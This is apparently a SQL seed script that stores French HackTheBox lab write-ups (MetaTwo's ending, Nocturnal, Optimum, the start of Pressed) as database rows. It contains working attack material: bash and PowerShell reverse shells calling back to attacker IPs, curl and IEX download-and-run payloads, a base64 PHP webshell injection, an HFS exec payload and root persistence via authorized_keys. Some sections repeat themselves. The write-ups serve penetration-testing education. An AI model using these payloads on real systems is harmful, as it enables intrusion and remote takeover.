### Escalade de Privilèges vers Root

Avec la passphrase de la clé **PGP**, je peux désormais utiliser l''utilitaire `passpie` pour exporter le mot de passe de l''utilisateur `root` en clair.

```bash
# Déchiffrement du mot de passe root via passpie
jnelson@meta2:~$ passpie copy --to stdout --passphrase blink182 root@ssh
p7qfAZt4_A1xo_0x

# Passage en root
jnelson@meta2:~$ su -
Password: p7qfAZt4_A1xo_0x
```

L''utilisation de `su -` avec le mot de passe récupéré permet d''obtenir un shell complet avec les privilèges **root**.

```bash
root@meta2:~# id
uid=0(root) gid=0(root) groups=0(root)
root@meta2:~# cat /root/root.txt
```

---

### Phase 3 : Élévation de Privilèges & Domination

Une fois l''accès initial établi en tant que **jnelson**, je débute l''énumération locale pour identifier des vecteurs d''escalade. L''examen du répertoire personnel révèle un dossier caché nommé `.passpie`.

#### 1. Analyse de Passpie
**Passpie** est un gestionnaire de mots de passe en ligne de commande qui utilise **GnuPG** pour chiffrer les informations d''identification dans des fichiers **YAML**.

```bash
# Identification des entrées stockées
passpie
# Exploration de la structure de stockage
ls -la ~/.passpie
cat ~/.passpie/ssh/root.pass
```

Le fichier `root.pass` contient un **PGP Message** chiffré. Pour le déchiffrer, je dois obtenir la **Passphrase** de la **Private Key** située dans `~/.passpie/.keys`.

> **Schéma Mental :**
> L''attaque repose sur une faiblesse de protection de la clé privée. Si la **Passphrase** protégeant la clé PGP est faible, je peux l''extraire, la **Brute Force** hors-ligne, puis utiliser la clé déverrouillée pour lire tous les secrets du coffre-fort (incluant le mot de passe **root**).

#### 2. Extraction et Cracking de la clé PGP
Je récupère le fichier de clés sur ma machine d''attaque pour isoler la clé privée et générer un hash compatible avec les outils de cracking.

```bash
# Extraction du hash de la clé privée (après avoir isolé le bloc PRIVATE)
gpg2john keys > gpg.hash

# Cracking de la passphrase avec John The Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt gpg.hash
```

Le mot de passe de la clé est identifié : `blink182`.

#### 3. Compromission Totale (Root)
Avec la **Passphrase** en main, je peux solliciter **Passpie** pour exporter le mot de passe de l''utilisateur **root** en clair.

```bash
# Déchiffrement du mot de passe root via passpie
passpie copy --to stdout --passphrase blink182 root@ssh

# Escalade de privilèges
su -
# Password: p7qfAZt4_A1xo_0x
id && cat /root/root.txt
```

---

### Beyond Root : Analyse Post-Exploitation

La compromission de **MetaTwo** met en lumière plusieurs défaillances critiques dans la gestion des secrets et la configuration des services :

1.  **Local Credential Storage Risk** : L''utilisation d''un gestionnaire de mots de passe CLI comme **Passpie** sur une machine partagée est une épée à double tranchant. Bien que les secrets soient chiffrés, la présence de la **Private Key** sur le même système permet à un attaquant ayant compromis un compte utilisateur de tenter un **Offline Brute Force**.
2.  **Weak Passphrase Policy** : La sécurité de l''intégralité du coffre-fort reposait sur une seule **Passphrase** présente dans `rockyou.txt`. Une politique de mots de passe robustes pour les clés de chiffrement est impérative.
3.  **Sensitive Data in Configuration Files** : Le vecteur initial vers **jnelson** a été facilité par la présence de credentials SMTP en clair dans un script PHP (`send_email.php`). Ces informations auraient dû être injectées via des **Environment Variables** ou un **Secret Management System** (type HashiCorp Vault) avec des permissions restrictives.
4.  **Plugin Vulnerability Management** : La chaîne d''attaque a débuté par une **SQL Injection** et une **XXE** dans des composants **WordPress** (BookingPress et Media Manager). Cela souligne l''importance d''un durcissement (Hardening) via des outils comme **Fail2Ban**, l''application systématique des mises à jour de sécurité et l''utilisation de **Web Application Firewalls (WAF)** pour bloquer les payloads XML malveillants.',
  'HackTheBox',
  'Easy',
  20,
  ARRAY['WordPress', 'XXE', 'WPScan'],
  'Ma phase de reconnaissance débute par un scan **Nmap** complet pour identifier la surface d''attaque.',
  true,
  now()
) ON CONFLICT (slug) DO UPDATE SET
  title = EXCLUDED.title,
  content = EXCLUDED.content,
  platform = EXCLUDED.platform,
  difficulty = EXCLUDED.difficulty,
  points = EXCLUDED.points,
  tags = EXCLUDED.tags,
  description = EXCLUDED.description;

-- Writeup: Nocturnal
INSERT INTO writeups (title, slug, content, platform, difficulty, points, tags, description, published, created_at)
VALUES (
  'HackTheBox: Nocturnal',
  'hackthebox-nocturnal',
  '<div class="kali-header">
  <div class="difficulty">Difficulté: Hard</div>
  <div class="points">Points: 40</div>
  <div class="os">OS: Windows</div>
</div>



### 1. Scanning & Énumération

La phase de reconnaissance commence par un scan **Nmap** complet pour identifier les vecteurs d''attaque potentiels.

```bash
# Scan rapide de tous les ports
nmap -p- --min-rate 10000 10.10.11.64

# Scan de services détaillé
nmap -p 22,80 -sCV 10.10.11.64
```

Le scan révèle deux ports ouverts :
*   **22/tcp (SSH)** : OpenSSH 8.2p1.
*   **80/tcp (HTTP)** : Nginx 1.18.0, redirigeant vers `http://nocturnal.htb/`.

J''ajoute l''entrée correspondante dans mon fichier `/etc/hosts` :
```bash
echo "10.10.11.64 nocturnal.htb" | sudo tee -a /etc/hosts
```

L''énumération des répertoires avec **feroxbuster** met en évidence une structure **PHP** classique et plusieurs points d''entrée intéressants :

```bash
feroxbuster -u http://nocturnal.htb -x php -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

Résultats notables :
*   `/login.php` & `/register.php` : Gestion des comptes.
*   `/dashboard.php` : Interface utilisateur après authentification.
*   `/view.php` : Script de visualisation/téléchargement de fichiers.
*   `/admin.php` : Panel administratif (redirection vers login si non-admin).
*   `/backups/` : Répertoire protégé (403 Forbidden).

---

### 2. Identification de l''IDOR & Fuite de données

En explorant les fonctionnalités utilisateur, je remarque que l''application permet d''uploader des fichiers (limités aux extensions `.doc`, `.odt`, etc.) et de les visualiser via `view.php`.

L''URL de visualisation suit ce format : `view.php?username=0xdf&file=document.doc`.

> **Schéma Mental : Insecure Direct Object Reference (IDOR)**
> L''application utilise deux paramètres (`username` et `file`) pour localiser un fichier sur le disque. Si le backend ne vérifie pas que le `username` dans l''URL correspond à l''utilisateur authentifié en session, je peux accéder aux fichiers de n''importe quel utilisateur.

En testant des noms d''utilisateurs aléatoires, je confirme une **User Enumeration** : l''application répond "User not found" si l''utilisateur n''existe pas. J''utilise **ffuf** pour identifier les utilisateurs valides via ce paramètre.

```bash
ffuf -u ''http://nocturnal.htb/view.php?username=FUZZ&file=test.doc'' \
     -b ''PHPSESSID=<MY_SESSION_ID>'' \
     -w /usr/share/seclists/Usernames/Names/names.txt \
     -fr ''User not found''
```

Utilisateurs identifiés : `admin`, `amanda`, `tobias`.

En interrogeant les fichiers de l''utilisateur `amanda`, je découvre un fichier nommé `privacy.odt`.
URL : `http://nocturnal.htb/view.php?username=amanda&file=privacy.odt`

Le document contient un mot de passe temporaire : **arHkG7HAI68X8s1J**. Ce mot de passe me permet de me connecter en tant qu''**amanda** sur le portail web.

---

### 3. Exploitation du Command Injection (RCE)

Une fois connecté en tant qu''**amanda**, j''accède à `/admin.php`. Cette page propose un utilitaire de sauvegarde qui demande un mot de passe pour chiffrer l''archive **ZIP**.

L''analyse du code source (récupéré via la sauvegarde elle-même) montre que l''entrée utilisateur est passée à la fonction `proc_open` après un filtrage via `cleanEntry`.

```php
function cleanEntry($entry) {
    $blacklist_chars = ['';'', ''&'', ''|'', ''$'', '' '', ''`'', ''{'', ''}'', ''&&''];
    // ... filtrage ...
}
```

La **Blacklist** est incomplète. Elle oublie le caractère **Newline** (`\n` ou `%0a`) et le caractère **Tab** (`\t` ou `%09`). Sous Linux, un saut de ligne dans un shell permet d''exécuter une nouvelle commande, et la tabulation peut remplacer l''espace pour séparer les arguments.

> **Schéma Mental : Bypass de Blacklist Shell**
> 1. La commande initiale est : `zip -r -P [PASSWORD] backup.zip .`
> 2. Injection : `[PASSWORD]%0a[COMMAND]%0a`
> 3. Résultat : Le shell exécute le zip, puis ma commande sur une nouvelle ligne.
> 4. Contrainte : Pas d''espaces autorisés -> Utilisation de `%09` (Tab).

#### Payload de Reverse Shell :
Comme le caractère `&` est filtré, je ne peux pas utiliser un one-liner Bash classique. Je vais donc télécharger un script shell depuis ma machine d''attaque.

1.  **Préparation du script (`rev.sh`)** :
```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.6/443 0>&1
```

2.  **Injection via le paramètre `password` dans la requête POST** :
```http
password=0xdf%0acurl%09http://10.10.14.6/rev.sh%09-o%09/tmp/rev.sh%0abash%09/tmp/rev.sh
```

En soumettant ce formulaire, le serveur exécute séquentiellement :
1.  La commande `zip` (qui échoue ou s''exécute partiellement).
2.  `curl http://10.10.14.6/rev.sh -o /tmp/rev.sh` (Téléchargement).
3.  `bash /tmp/rev.sh` (Exécution).

Je reçois une connexion sur mon listener :
```bash
nc -lnvp 443
# Connection received on 10.10.11.64
www-data@nocturnal:~/nocturnal.htb$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Le premier accès est établi en tant que **www-data**.

---

### Énumération Interne & Post-Exploitation

Une fois mon accès **www-data** stabilisé, je procède à une énumération du système pour identifier des vecteurs de mouvement latéral. L''inspection des répertoires web révèle une base de données **SQLite3** hors du **Document Root** classique.

```bash
# Identification des utilisateurs avec un shell valide
cat /etc/passwd | grep ''sh$''

# Exploration de la base de données
sqlite3 /var/www/nocturnal_database/nocturnal_database.db
sqlite> .tables
sqlite> select * from users;
```

La table `users` contient des hashes **MD5**. Le hash de l''utilisateur **tobias** (`55c82b1ccd55ab219b3b109b07d5061d`) est rapidement cassé via **CrackStation** ou **Hashcat**, révélant le mot de passe : `slowmotionapocalypse`.

> **Schéma Mental :**
> Accès initial (`www-data`) -> Énumération du système de fichiers -> Extraction de base de données locale -> **Credential Dumping** (Hashes MD5) -> **Cracking** hors-ligne -> Pivot vers l''utilisateur système.

### Mouvement Latéral : Pivot vers Tobias

Le mot de passe récupéré est valide pour une session **SSH**, ce qui me permet d''obtenir un shell plus stable et de récupérer le premier flag (`user.txt`).

```bash
ssh tobias@nocturnal.htb
# Password: slowmotionapocalypse
cat /home/tobias/user.txt
```

### Escalade de Privilèges : De Tobias à Root

L''énumération des services locaux via `netstat` ou `ss` montre un service écoutant sur le port **127.0.0.1:8080**. L''analyse des processus confirme qu''une instance de **PHP** (serveur intégré) tourne avec les privilèges **root** dans le répertoire `/var/www/ispconfig`.

```bash
# Vérification des ports en écoute
netstat -tnl
# Identification du processus root
ps auxww | grep 8080
```

#### Tunneling & Accès à ISPConfig
Puisque le port 8080 n''est accessible que localement, j''utilise le **Local Port Forwarding** via **SSH** pour y accéder depuis ma machine d''attaque.

```bash
ssh -L 9001:localhost:8080 tobias@nocturnal.htb
```

En naviguant sur `http://127.0.0.1:9001`, je découvre l''interface **ISPConfig 3.2**. Les identifiants de **tobias** (`admin` / `slowmotionapocalypse`) fonctionnent sur ce panel administratif.

#### Exploitation de la CVE-2023-46818
Cette version est vulnérable à une **PHP Code Injection** dans l''éditeur de langue (`/admin/language_edit.php`). L''attaque consiste à injecter du code PHP arbitraire dans les fichiers de traduction, qui sont ensuite inclus et exécutés par le serveur.

> **Schéma Mental :**
> Service local root (ISPConfig) -> **SSH Tunneling** -> Authentification Admin -> **PHP Code Injection** (CVE-2023-46818) -> Écriture d''un **Webshell** dans un répertoire accessible -> Exécution de commandes en tant que **root**.

#### Exploitation Manuelle (POC)
L''injection nécessite de contourner les protections **CSRF**. Je crée un nouveau fichier de langue, récupère les jetons CSRF (`csrf_id` et `csrf_key`), puis j''injecte une charge utile via le paramètre `records[]`.

```http
POST /admin/language_edit.php HTTP/1.1
...
records[\]=PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsiY21kIl0pIDsgPz4K&csrf_id=...&csrf_key=...
```
*Note : La charge utile est un webshell encodé en Base64 pour éviter les problèmes de caractères spéciaux.*

#### Exploitation Automatisée
Un script Python peut automatiser le processus : authentification, récupération des tokens, injection du webshell et interaction.

```bash
# Utilisation d''un exploit public pour la CVE-2023-46818
python3 exploit_ispconfig.py http://localhost:9001 admin slowmotionapocalypse

# Une fois le webshell en place, stabilisation via SSH
echo "ssh-ed25519 AAAAC3... root@attackbox" > /root/.ssh/authorized_keys
ssh root@nocturnal.htb
```

L''exécution de `id` confirme l''accès **uid=0(root)**. Le flag final se trouve dans `/root/root.txt`.

---

### Élévation de Privilèges : De Tobias à Root

Une fois le shell obtenu en tant que **tobias**, l''énumération locale révèle des services écoutant uniquement sur l''interface de loopback. L''utilisation de `netstat -tnl` confirme la présence d''un service sur le port **8080/TCP**.

```bash
# Vérification des ports en écoute
netstat -tnl
# Identification du processus lié au port 8080
ps auxww | grep 8080
# Résultat : /usr/bin/php -S 127.0.0.1:8080 (exécuté par root)
```

Le processus est une instance de **PHP Development Server** tournant avec les privilèges **root**. Pour interagir avec ce service depuis ma machine d''attaque, je mets en place un **Local Port Forwarding** via **SSH**.

```bash
# Tunneling SSH pour accéder à l''interface d''administration
ssh -L 9001:localhost:8080 tobias@nocturnal.htb
```

En naviguant sur `http://127.0.0.1:9001`, je tombe sur une mire de connexion **ISPConfig 3.2**. Par réflexe de **Password Reuse**, je teste les identifiants de **tobias** pour le compte `admin`. La connexion réussit, me donnant accès au dashboard d''administration.

#### Exploitation de la CVE-2023-46818 (PHP Code Injection)

L''instance **ISPConfig** (version < 3.2.11p1) est vulnérable à une **PHP Code Injection** au niveau de l''éditeur de fichiers de langue (**Language File Editor**). Cette vulnérabilité permet à un administrateur d''injecter du code arbitraire dans les fichiers `.lng` si l''option `admin_allow_langedit` est active.

> **Schéma Mental :**
> Accès Local (Port 8080) -> SSH Tunneling -> Authentification ISPConfig (Password Reuse) -> Injection de code PHP via l''éditeur de langue -> RCE avec privilèges Root (car le serveur PHP tourne en root).

Bien qu''une exploitation manuelle soit possible en interceptant les **CSRF Tokens** et en injectant des payloads dans le paramètre `records[]`, l''utilisation d''un exploit public en Python s''avère plus efficace pour stabiliser l''accès.

```python
# Utilisation de l''exploit pour obtenir un webshell
uv run cve-2023-46818.py http://localhost:9001 admin slowmotionapocalypse

# Une fois le shell obtenu, vérification des privilèges
id
# uid=0(root) gid=0(root) groups=0(root)
```

Pour garantir une persistance stable et éviter les limitations du webshell, j''injecte ma clé publique SSH dans le fichier `authorized_keys` de l''utilisateur **root**.

```bash
# Persistance SSH
echo "ssh-ed25519 AAAAC3Nza...[snip]... user@attackbox" > /root/.ssh/authorized_keys
ssh -i id_rsa root@nocturnal.htb
```

---

### Analyse Post-Exploitation : "Beyond Root"

L''analyse du vecteur d''entrée initial révèle une particularité intéressante concernant la fonctionnalité de téléchargement de fichiers (`view.php`), qui a été patchée peu après la sortie de la machine.

#### Le problème du "Wrapped HTML"
Initialement, le script `view.php` ne se contentait pas de servir le fichier brut. Il encapsulait le contenu binaire (comme un fichier `.odt`) à l''intérieur d''une structure **HTML**. Le serveur envoyait un header `Content-Type: application/octet-stream`, mais le corps de la réponse contenait des balises `<html>` et `<body>` entourant les données binaires.

```http
HTTP/1.1 200 OK
Content-Type: application/octet-stream
Content-Disposition: attachment; filename="privacy.odt"

<!DOCTYPE html>
<html>... [HTML CONTENT] ... PK [BINARY DATA] ...</html>
```

#### Techniques de récupération de fichiers corrompus
Pour extraire le fichier **Amanda** (`privacy.odt`) malgré cette corruption, plusieurs approches étaient possibles :

1.  **Extraction Manuelle :** Utiliser un éditeur hexadécimal ou `vim` pour supprimer tous les octets précédant les **Magic Bytes** du format ZIP (`PK` ou `50 4B 03 04`), qui structurent les fichiers OpenDocument.
2.  **Tolérance aux pannes de ZIP :** Le format ZIP permet souvent de récupérer des données même si des octets superflus sont présents en début de fichier. La commande `unzip` ignore généralement le "garbage" initial.
3.  **Office Recovery :** Les suites bureautiques comme LibreOffice ou Word détectent la structure XML interne et proposent une réparation automatique du document en ignorant les balises HTML externes.

Cette phase démontre l''importance de comprendre les structures de fichiers binaires lors de l''exploitation de vulnérabilités de type **Insecure Direct Object Reference (IDOR)** ou **File Leak**, où le transport des données peut altérer l''intégrité du payload.',
  'HackTheBox',
  'Hard',
  40,
  ARRAY['Active Directory', 'Web', 'RCE'],
  'La phase de reconnaissance commence par un scan **Nmap** complet pour identifier les vecteurs d''attaque potentiels.',
  true,
  now()
) ON CONFLICT (slug) DO UPDATE SET
  title = EXCLUDED.title,
  content = EXCLUDED.content,
  platform = EXCLUDED.platform,
  difficulty = EXCLUDED.difficulty,
  points = EXCLUDED.points,
  tags = EXCLUDED.tags,
  description = EXCLUDED.description;

-- Writeup: Optimum
INSERT INTO writeups (title, slug, content, platform, difficulty, points, tags, description, published, created_at)
VALUES (
  'HackTheBox: Optimum',
  'hackthebox-optimum',
  '<div class="kali-header">
  <div class="difficulty">Difficulté: Easy</div>
  <div class="points">Points: 20</div>
  <div class="os">OS: Linux</div>
</div>



### Phase 1 : Reconnaissance & Brèche Initiale

#### 1. Scanning et Énumération de Services

La phase de reconnaissance commence par un scan **Nmap** exhaustif pour identifier la surface d''attaque. L''objectif est de découvrir les ports ouverts et les versions des services associés.

```bash
# Scan rapide de tous les ports TCP
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.8

# Scan ciblé avec scripts par défaut et détection de version
nmap -p 80 -sCV -oA scans/nmap-tcpscripts 10.10.10.8
```

Le scan révèle un unique point d''entrée :
*   **Port 80/TCP** : Service **HttpFileServer (HFS) httpd 2.3**.

L''en-tête HTTP confirme l''utilisation de **Rejetto HFS version 2.3**, un logiciel de partage de fichiers souvent vulnérable dans ses anciennes versions. Le système d''exploitation est identifié comme étant **Windows**.

#### 2. Identification du Vecteur d''Entrée

Une recherche via **searchsploit** pour "HttpFileServer 2.3" pointe immédiatement vers une vulnérabilité critique de **Remote Command Execution (RCE)**.

*   **Vulnérabilité** : **CVE-2014-6287**.
*   **Type** : Injection de macros via le paramètre `search`.
*   **Mécanisme** : Le logiciel échoue à filtrer correctement les caractères nuls (`%00`) dans l''URL, permettant d''exécuter des commandes système via la directive `{.exec|... .}`.

> **Schéma Mental : Chaîne d''Exploitation RCE**
> `Requête HTTP GET` -> `Paramètre ?search=%00` -> `Bypass du filtre` -> `Exécution de macro HFS` -> `Appel à cmd.exe` -> `Payload arbitraire`

#### 3. Preuve de Concept (PoC) et Analyse

Avant de tenter un **Reverse Shell**, je vérifie l''exécution de commandes en forçant la cible à émettre un **ICMP Echo Request** (ping) vers ma machine d''attaque.

```bash
# Préparation de l''écoute ICMP
sudo tcpdump -i tun0 icmp

# Payload URL-encodé pour le test
http://10.10.10.8/?search=%00{.exec|cmd.exe+/c+ping+/n+1+10.10.14.10.}
```

La réception des paquets ICMP confirme que la **RCE** est fonctionnelle. Je note que l''utilisation de `cmd.exe /c` est nécessaire pour garantir l''exécution dans l''environnement du service.

#### 4. Obtention du Premier Shell

Pour obtenir un accès interactif, j''utilise un **PowerShell One-Liner** issu du framework **Nishang** (`Invoke-PowerShellTcpOneLine.ps1`). 

**Étapes de l''attaque :**
1.  Hébergement du script `rev.ps1` sur mon serveur local.
2.  Utilisation d''un **PowerShell Cradle** via la **RCE** pour télécharger et exécuter le script en mémoire (**Fileless**).

```powershell
# Contenu de rev.ps1 (Nishang)
$client = New-Object System.Net.Sockets.TCPClient(''10.10.14.10'',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|% {0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

**Exécution de la brèche :**

```bash
# Lancement du serveur HTTP et du listener
sudo python3 -m http.server 80
sudo rlwrap nc -lnvp 443

# Payload final envoyé via le navigateur ou curl
http://10.10.10.8/?search=%00{.exec|C%3a\Windows\System32\WindowsPowerShell\v1.0\powershell.exe+IEX(New-Object+Net.WebClient).downloadString(''http%3a//10.10.14.10/rev.ps1'').}
```

La connexion est établie avec succès. Je récupère un shell en tant qu''utilisateur **optimum\kostas**.

#### 5. Analyse de l''Architecture

Une vérification immédiate de l''architecture du processus est cruciale sur Windows pour les phases ultérieures :

```powershell
[Environment]::Is64BitProcess
# Retourne : False
```

Bien que l''OS soit un **Windows Server 2012 R2 (x64)**, mon shell actuel tourne dans un processus **32-bit (x86)** car le service **HFS** est lui-même en 32-bit. Cette information est capitale : pour exploiter des vulnérabilités de noyau (Kernel exploits) sur un système 64-bit, je devrai impérativement migrer vers un processus 64-bit ou appeler directement le binaire **PowerShell** situé dans `C:\Windows\SysNative\`.

---

### Énumération Post-Exploitation

Une fois le premier accès obtenu en tant que **kostas**, mon objectif est d''identifier des vecteurs d''élévation de privilèges. Sur une machine Windows de cet âge (2017), je privilégie l''énumération des vulnérabilités de **Kernel**.

J''utilise d''abord **winPEAS** pour obtenir une vue d''ensemble du système.

```powershell
# Transfert de winPEAS via SMB
copy \\10.10.14.10\share\winPEAS.exe .
.\winPEAS.exe
```

L''output confirme que nous sommes sur un **Windows Server 2012 R2 Standard** (64-bit). Bien que **winPEAS** trouve des identifiants **AutoLogon** pour `kostas` (`kdeEjDowkS*`), ils ne permettent pas une progression directe vers un compte plus privilégié.

Pour l''énumération spécifique aux **Kernel Exploits**, je tente d''utiliser **Watson**. Cependant, l''outil échoue car il requiert **.NET 4.5**, alors que la cible ne dispose que de la version **4.0**. Je pivote donc vers **Sherlock**, un prédécesseur basé sur **PowerShell**.

```powershell
# Exécution de Sherlock en mémoire via un IEX (Invoke-Expression)
IEX(New-Object Net.WebClient).downloadstring(''http://10.10.14.10/Sherlock.ps1'')
```

**Sherlock** identifie trois vulnérabilités potentielles :
*   **MS16-032** (Secondary Logon Handle)
*   **MS16-034** (Windows Kernel-Mode Drivers)
*   **MS16-135** (Win32k Elevation of Privilege)

> **Schéma Mental :** 
> Accès Initial (`kostas`) -> Échec des outils récents (**Watson**/.NET incompatibility) -> Utilisation de scripts legacy (**Sherlock**) -> Identification de failles **Kernel**.

---

### Analyse de l''Architecture et Pivot 64-bit

Un point critique lors de l''exploitation de **Kernel Exploits** sur Windows est l''adéquation entre l''architecture du processus de l''exploit et celle du système d''exploitation. 

Mon **Reverse Shell** initial provient du processus `hfs.exe`, qui est une application **32-bit**. Par conséquent, mon instance **PowerShell** tourne en mode **32-bit** (WoW64), ce qui fait échouer la plupart des exploits ciblant un noyau **64-bit**.

Je vérifie l''architecture du processus actuel :
```powershell
[Environment]::Is64BitProcess
# Retourne : False
```

Pour contourner la redirection automatique vers `System32` (qui contient les binaires 32-bit dans ce contexte), je dois appeler explicitement le binaire **PowerShell** 64-bit via le chemin virtuel **SysNative**.

```bash
# Payload pour obtenir un shell 64-bit
/?search=%00{.exec|C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe+IEX(New-Object+Net.WebClient).downloadString(''http://10.10.14.10/rev.ps1'').}
```

Une fois le nouveau shell reçu, je confirme le passage en **64-bit** :
```powershell
[Environment]::Is64BitProcess
# Retourne : True
```

---

### Élévation de Privilèges : MS16-032

Je choisis d''exploiter la vulnérabilité **MS16-032** (**CVE-2016-0099**). Cette faille réside dans le service **Secondary Logon** qui ne vérifie pas correctement les handles de thread lors du lancement de processus avec des privilèges différents.

J''utilise une version modifiée du script **Invoke-MS16032.ps1** issue du projet **Empire**, car elle permet de passer une commande personnalisée au lieu de simplement tenter de lancer une fenêtre interactive.

```powershell
# Préparation du script avec l''appel de fonction à la fin
Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString(''http://10.10.14.10/rev.ps1'')"
```

J''héberge le script sur mon serveur HTTP et je l''exécute depuis mon shell **64-bit** :

```powershell
IEX(New-Object Net.WebClient).downloadstring(''http://10.10.14.10/Invoke-MS16032.ps1'')
```

> **Schéma Mental :**
> Shell 32-bit (Incompatible) -> **SysNative** Redirection -> Shell 64-bit -> **MS16-032** Exploit -> **Handle Leak** -> Exécution de payload en tant que **SYSTEM**.

L''exploit réussit, déclenche un nouveau téléchargement de mon script de **Reverse Shell** et m''offre une session avec les privilèges les plus élevés.

```bash
# Réception du shell final
whoami
nt authority\system
```

---

### Énumération Post-Exploitation

Une fois mon accès initial établi en tant que **kostas**, je débute l''énumération du système pour identifier des vecteurs d''**Elevation of Privileges (EoP)**. Le système est un **Windows Server 2012 R2** (Architecture **AMD64**). 

J''utilise d''abord **winPEAS.exe** transféré via un partage **SMB**. Bien que l''outil identifie des **AutoLogon credentials** pour l''utilisateur **kostas** (`kdeEjDowkS*`), ces derniers ne permettent pas une élévation directe vers **SYSTEM**. Je me tourne alors vers l''énumération des vulnérabilités de **Kernel**. Comme **Watson** échoue en raison d''une version de **.NET Framework** incompatible (v4.0 installée, v4.5 requise), j''utilise son prédécesseur : **Sherlock.ps1**.

```powershell
# Exécution de Sherlock via un PowerShell Cradle
IEX(New-Object Net.WebClient).downloadstring(''http://10.10.14.10/Sherlock.ps1'')
```

**Sherlock** identifie trois vulnérabilités potentielles : **MS16-032**, **MS16-034**, et **MS16-135**.

---

### Le Piège de l''Architecture (32-bit vs 64-bit)

Mes premières tentatives d''exploitation échouent systématiquement. En vérifiant l''environnement, je réalise que mon **Reverse Shell** tourne dans un processus 32-bit, bien que l''OS soit en 64-bit. Cela est dû au fait que le service vulnérable (**HFS**) est une application 32-bit.

> **Schéma Mental : Redirection de Système de Fichiers**
> Sur un Windows 64-bit, un processus 32-bit appelant `C:\Windows\System32` est redirigé de manière transparente vers `C:\Windows\SysWOW64`. Pour exécuter des exploits **Kernel** 64-bit, je dois impérativement forcer l''utilisation d''un binaire 64-bit en utilisant l''alias **SysNative**.

Pour obtenir un shell 64-bit stable, je relance mon exploit initial en ciblant spécifiquement le binaire **PowerShell** 64-bit :

```bash
# Payload pour forcer un shell 64-bit
/?search=%00{.exec|C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString(''http://10.10.14.10/rev.ps1'').}
```

Vérification de l''architecture dans le nouveau shell :
```powershell
[Environment]::Is64BitProcess
# Output: True
```

---

### Exploitation de MS16-032 (Secondary Logon Handle)

Je choisis l''exploit **MS16-032** (vulnérabilité du service **Secondary Logon**). La version publique d''**Exploit-DB** tente d''ouvrir une fenêtre graphique, ce qui est inutile sur un shell distant. J''utilise donc la version modifiée du projet **Empire** qui permet de passer une commande spécifique.

> **Schéma Mental : MS16-032**
> La vulnérabilité réside dans la manière dont le service **Secondary Logon** gère les **Handles** de threads. En exploitant un **Race Condition** et une corruption de mémoire, on peut forcer le système à copier un **Access Token** de niveau **SYSTEM** vers un processus contrôlé par l''attaquant.

```powershell
# Préparation de l''exploit (ajout de l''appel à la fin du script .ps1)
Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString(''http://10.10.14.10/rev.ps1'')"

# Exécution depuis le shell 64-bit
IEX(New-Object Net.WebClient).downloadstring(''http://10.10.14.10/Invoke-MS16032.ps1'')
```

L''exploit déclenche un nouveau callback vers mon listener **Netcat**, m''octroyant les privilèges **nt authority\system**.

---

### Beyond Root : Analyse Post-Exploitation

La compromission totale d''**Optimum** met en lumière deux points critiques souvent rencontrés en environnement réel :

1.  **Gestion des correctifs (Patch Management) :** Le serveur tournait sur une version de **Windows Server 2012 R2** non patchée contre des vulnérabilités critiques de 2016. Dans un environnement durci, l''activation de **Windows Update** ou l''utilisation de **WSUS** aurait mitigé les vecteurs **MS16-032/034/135**.
2.  **Architecture Context Awareness :** L''échec initial de l''élévation souligne l''importance de la distinction entre l''architecture de l''OS et l''architecture du processus compromis. Un attaquant doit toujours vérifier `Is64BitProcess` avant de déployer un exploit **Kernel**, car les structures de données mémoire (comme la **GDT** ou la **LDT**) diffèrent radicalement.
3.  **Alternative d''exploitation :** Outre le **Kernel Exploit**, la présence de credentials en clair dans la configuration d''**AutoLogon** (trouvés par **winPEAS**) aurait pu permettre un mouvement latéral ou une persistance via **RunAs** si l''utilisateur avait eu des privilèges plus élevés sur d''autres machines du domaine.',
  'HackTheBox',
  'Easy',
  20,
  ARRAY['HFS', 'CVE-2014-6287', 'Kernel Exploit'],
  'La phase de reconnaissance commence par un scan **Nmap** exhaustif pour identifier la surface d''attaque. L''objectif est de découvrir les ports ouverts et les versions des services associés.',
  true,
  now()
) ON CONFLICT (slug) DO UPDATE SET
  title = EXCLUDED.title,
  content = EXCLUDED.content,
  platform = EXCLUDED.platform,
  difficulty = EXCLUDED.difficulty,
  points = EXCLUDED.points,
  tags = EXCLUDED.tags,
  description = EXCLUDED.description;

-- Writeup: Pressed
INSERT INTO writeups (title, slug, content, platform, difficulty, points, tags, description, published, created_at)
VALUES (
  'HackTheBox: Pressed',
  'hackthebox-pressed',
  '<div class="kali-header">
  <div class="difficulty">Difficulté: Easy</div>
  <div class="points">Points: 20</div>
  <div class="os">OS: Linux</div>
</div>



### Reconnaissance & Énumération

Ma phase de reconnaissance commence par un scan **Nmap** exhaustif pour identifier les ports ouverts et les services associés.

```bash
# Scan rapide de tous les ports
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.142

# Scan de scripts et versions sur le port 80
nmap -p 80 -sCV -oA scans/nmap-tcpscripts 10.10.11.142
```

Le scan révèle un serveur **Apache 2.4.41** sur **Ubuntu** faisant tourner **WordPress 5.9**. Je rajoute `pressed.htb` à mon fichier `/etc/hosts`.

J''utilise ensuite **WPScan** pour une énumération spécifique au CMS. L''outil identifie deux éléments critiques :
1.  L''interface **XML-RPC** est activée (`/xmlrpc.php`).
2.  Un fichier de sauvegarde de configuration est accessible : `wp-config.php.bak`.

```bash
wpscan --url http://pressed.htb --api-token $WPSCAN_API
```

En inspectant `wp-config.php.bak`, je récupère des identifiants de base de données :
*   **DB_USER** : `admin`
*   **DB_PASSWORD** : `uhc-jan-finals-2021`

### Vecteur d''Entrée : XML-RPC & 2FA Bypass

